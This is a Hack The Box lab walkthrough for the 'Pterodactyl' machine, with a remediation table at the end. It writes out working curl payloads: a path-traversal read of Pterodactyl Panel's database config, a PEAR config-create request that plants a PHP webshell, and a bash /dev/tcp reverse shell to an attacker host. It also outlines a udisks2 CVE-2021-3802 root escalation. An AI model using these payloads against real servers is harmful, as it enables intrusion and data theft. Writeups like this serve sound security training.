<div align="center">

# 🦖 HTB: Pterodactyl

![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)

`hackthebox` `linux` `lfi` `pearcmd-rce` `cve-2021-3802` `udisks2`

</div>

---

> **TL;DR** — A locale-switching endpoint has an unauthenticated path-traversal bug that reads arbitrary files, which leaks database creds outright. Chained with PHP's PEAR command-line tool (also reachable via the same LFI), that traversal turns into a webshell and RCE. From there, a known `udisks2` race condition (CVE-2021-3802) gets you root.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Linux |
| 🎯 **Target** | `<TARGET_IP>` (pterodactyl.htb) |
| 🎚️ **Difficulty** | Medium |
| 📅 **Date** | February 7, 2026 |
| 🏁 **Outcome** | ✅ Full compromise |

## 🔍 Recon

```bash
nmap -sV -sC -p- <TARGET_IP> -T3 --min-rate 5000
```

| Port | Service |
|:---:|---|
| `22` | OpenSSH 9.6 |
| `80` | nginx 1.21.5 — "My Minecraft Server" |

Virtual host enumeration turns up `panel.pterodactyl.htb` — the actual admin panel, running **Pterodactyl Panel** (a Laravel-based game-server management app).

---

## 🚩 Shell as `wwwrun` — LFI → PEAR → RCE

### Finding the traversal

```bash
curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
```

The `locale`/`namespace` parameters go straight into a file read with no sanitization:

```json
{"../../../pterodactyl":{"config/database":{"connections":{"mysql":{
  "host":"127.0.0.1","port":"3306","database":"panel",
  "username":"pterodactyl","password":"PteraPanel"
}}}}}
```

Plaintext DB creds, straight off the config file — `pterodactyl : PteraPanel` against MySQL on `127.0.0.1:3306`.

> ⚠️ **Root cause:** unvalidated `locale`/`namespace` parameters passed into a file-read function. Classic path traversal (CWE-22), made worse here by sensitive config living inside the web root's reach.

### Turning LFI into RCE via PEAR

PHP installs commonly ship `/usr/share/php/PEAR/pearcmd.php`. If it's includable via the same LFI, its `config-create` command can be abused to **write** a file — including a PHP webshell — anywhere the web server user can write.

**Step 1 — write the webshell to `/tmp/sh.php`:**

```bash
curl -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=\`\$_GET[c]\`?>+/tmp/sh.php"
```

```
Successfully created default configuration file "/tmp/sh.php"
```

**Step 2 — trigger it through the same LFI, now pointed at `/tmp`:**

```bash
curl -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=sh&c=id"
```

```
uid=474(wwwrun) gid=477(www) groups=477(www)
```

Command execution confirmed. Upgrade to an interactive shell:

```bash
# listener: nc -lvnp 1337
curl -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=sh&c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/1337+0>%261'"
```

```
wwwrun@pterodactyl:/var/www/pterodactyl/public$
```

```bash
cat /home/phileasfogg3/user.txt
<USER_FLAG_REDACTED>
```

**Artifacts:** `EV-002` (LFI DB-config disclosure) · webshell write/execute transcripts above

---

## 👑 Root — CVE-2021-3802 (udisks2 XFS Race)

`udisks2` handles disk/filesystem mounting and has historically run with elevated privileges via polkit. CVE-2021-3802 is a race condition in how it resizes XFS filesystems — win the race, and you get code execution as root.

**Attack summary:**
1. Build a malicious XFS filesystem image containing a SUID-root `bash`, on the attacker box.
2. Transfer the ~300MB image to the target via SCP.
3. Set the PAM/polkit environment variables needed for an authenticated session.
4. `udisksctl loop-setup` to mount the image as a loop device.
5. Trigger the race via a `gdbus` call to the Filesystem `Resize` method.
6. Race window hits → SUID bash gets written out under `/tmp/`.

```bash
phileasfogg3@pterodactyl:/tmp$ /tmp/blockdev.IL6OK3/bash -p
bash-5.3# whoami
root
```

```bash
root@pterodactyl:/tmp# cat /root/root.txt
<ROOT_FLAG_REDACTED>
```

> 💡 This is a known, patched CVE — the takeaway for defense is simply: **keep `udisks2` patched.** No amount of app-layer hardening on Pterodactyl Panel would have stopped this once local access was gained.

---

## ✅ Proof of Compromise

| Flag | Value |
|---|---|
| User | `<USER_FLAG_REDACTED>` |
| Root | `<ROOT_FLAG_REDACTED>` |
| Status | ✅ **PWNED** |

## 🛠️ Remediation

| Finding | Fix |
|---|---|
| LFI in `/locales/locale.json` | Whitelist allowed `locale`/`namespace` values; canonicalize and reject traversal sequences; move config outside the web root. |
| DB credentials in plaintext config | Rotate immediately; use a secrets manager or encrypted env vars; least-privilege DB accounts. |
| PEAR CLI reachable via app user | Remove PEAR CLI tooling from production hosts; it has no business being reachable by a web app. |
| `udisks2` CVE-2021-3802 | Patch to a fixed `udisks2` version — this is a known, disclosed CVE with vendor fixes available. |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

</div>
